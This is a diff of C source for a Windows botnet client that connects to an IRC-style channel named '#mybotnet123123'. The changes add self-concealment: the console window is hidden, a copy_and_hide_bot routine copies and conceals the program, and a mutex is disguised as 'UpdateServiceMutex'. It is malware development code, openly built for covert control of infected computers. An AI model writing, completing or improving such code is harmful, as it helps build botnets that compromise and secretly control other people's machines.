@@ -1,21 +1,29 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #define _CRT_SECURE_NO_WARNINGS
-#include <winsock2.h>       // Socket connection
-#include <windows.h>        // WinAPI calls
-#include <ws2tcpip.h>       // TCP-IP Sockets
-#include <stdio.h>
-#include <string.h>
 #include "header.h"
 
-#pragma comment(lib, "Ws2_32.lib")
-#pragma comment(lib, "crypt32.lib")
+HANDLE hMutex;
+
+BOOL is_already_running() {
+    // 使用 Mutex 防止重复运行
+    hMutex = CreateMutexW(NULL, FALSE, L"Global\\UpdateServiceMutex");
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        wprintf(L"[!] Another instance is already running.\n");
+        return TRUE;
+    }
+    return FALSE;
+}
 
 
 
 
-#define DEBUG 0
+
+
  
 int main(int argc, char* argv[]) {
+
+    //Sleep(1000 * 2);
+
     if (!DEBUG) {
         HWND hwnd = GetConsoleWindow();  // 获取控制台窗口句柄
         if (hwnd) {
@@ -23,10 +31,21 @@ int main(int argc, char* argv[]) {
         }
     }
 
+    if (!is_hidden_bot() && HIDE_ON_ENTRY) {
+        printf("Starting to hide myself...\n");
+        copy_and_hide_bot();
+        WSACleanup();
+        return 0;
+    }
+    else {
+        printf("Is hidden process, starting to run...\n");
+    }
+
+    //if (is_already_running())// fuck this
+    //    exit(0);
+
     const char* owner = "#mybotnet123123";
     const char* channel = "#mybotnet123123";
-
-
     int reconnectAttempts = 0;
 
     while (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS) {
